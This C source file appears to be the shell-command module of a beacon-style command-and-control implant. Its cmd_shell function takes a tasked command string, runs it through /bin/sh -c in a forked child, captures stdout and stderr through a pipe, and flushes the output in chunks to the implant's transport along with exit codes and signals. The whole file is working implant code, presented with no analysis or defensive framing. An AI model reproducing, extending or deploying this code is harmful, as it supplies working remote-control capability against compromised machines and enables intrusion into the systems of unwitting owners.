// Shell command execution: fork + exec /bin/sh -c <cmd>
// Captures stdout + stderr via pipe.

#include "../core/beacon.h"
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include <errno.h>
#include <stdio.h>

void cmd_shell(const BeaconTask* t) {
    out_begin(t->id, RESP_OUTPUT);

    if (!t->pay || t->pay_len == 0) {
        out_write("error: no command\n", 18);
        return;
    }

    // Null-terminate the command string
    char* cmd = (char*)bmalloc(t->pay_len + 1);
    if (!cmd) { out_write("error: alloc failed\n", 20); return; }
    memcpy(cmd, t->pay, t->pay_len);
    cmd[t->pay_len] = 0;

    // Create pipe for stdout+stderr capture
    int pipefd[2];
    if (pipe(pipefd) != 0) {
        out_write("error: pipe() failed\n", 21);
        bfree(cmd);
        return;
    }

    pid_t pid = fork();
    if (pid < 0) {
        out_write("error: fork() failed\n", 21);
        close(pipefd[0]);
        close(pipefd[1]);
        bfree(cmd);
        return;
    }

    if (pid == 0) {
        // Child process
        close(pipefd[0]);  // close read end
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[1]);

        execl("/bin/sh", "sh", "-c", cmd, (char*)NULL);
        _exit(127);  // exec failed
    }

    // Parent process
    close(pipefd[1]);  // close write end
    bfree(cmd);

    // Read output from child
    char buf[4096];
    ssize_t n;
    while ((n = read(pipefd[0], buf, sizeof(buf))) > 0) {
        out_write(buf, (size_t)n);
        // Flush in chunks if buffer is filling up
        if (out_remaining() < 1024) {
            out_flush_chunk(get_transport(), 0);
        }
    }
    close(pipefd[0]);

    // Wait for child to finish
    int status = 0;
    waitpid(pid, &status, 0);

    // Append exit code info if non-zero
    if (WIFEXITED(status) && WEXITSTATUS(status) != 0) {
        char exit_msg[64];
        int len = snprintf(exit_msg, sizeof(exit_msg),
                           "\n[exit code: %d]\n", WEXITSTATUS(status));
        if (len > 0) out_write(exit_msg, (size_t)len);
    } else if (WIFSIGNALED(status)) {
        char sig_msg[64];
        int len = snprintf(sig_msg, sizeof(sig_msg),
                           "\n[killed by signal: %d]\n", WTERMSIG(status));
        if (len > 0) out_write(sig_msg, (size_t)len);
    }
}
